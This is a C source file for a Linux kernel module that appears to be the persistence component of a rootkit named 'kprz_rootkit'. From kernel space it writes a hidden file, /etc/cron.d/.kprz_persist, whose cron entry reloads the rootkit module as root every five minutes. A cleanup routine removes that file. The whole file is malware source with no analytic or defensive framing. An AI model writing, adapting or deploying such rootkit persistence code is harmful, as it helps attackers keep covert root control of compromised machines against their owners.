#include "persistence.h"
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define PERSISTENCE_PATH "/etc/cron.d/.kprz_persist"

static void create_cron_persistence(void) {
    struct file *f;
    mm_segment_t old_fs;
    char *cron_line = "*/5 * * * * root insmod /lib/modules/kprz_rootkit.ko\n";

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    f = filp_open(PERSISTENCE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (!IS_ERR(f)) {
        kernel_write(f, cron_line, strlen(cron_line), 0);
        filp_close(f, NULL);
    }

    set_fs(old_fs);
}

static void remove_cron_persistence(void) {
    struct path path;
    if (kern_path(PERSISTENCE_PATH, LOOKUP_FOLLOW, &path) == 0)
        vfs_unlink(path.dentry->d_parent->d_inode, path.dentry, NULL);
}

void setup_persistence(void) {
    create_cron_persistence();
}

void cleanup_persistence(void) {
    remove_cron_persistence();
}
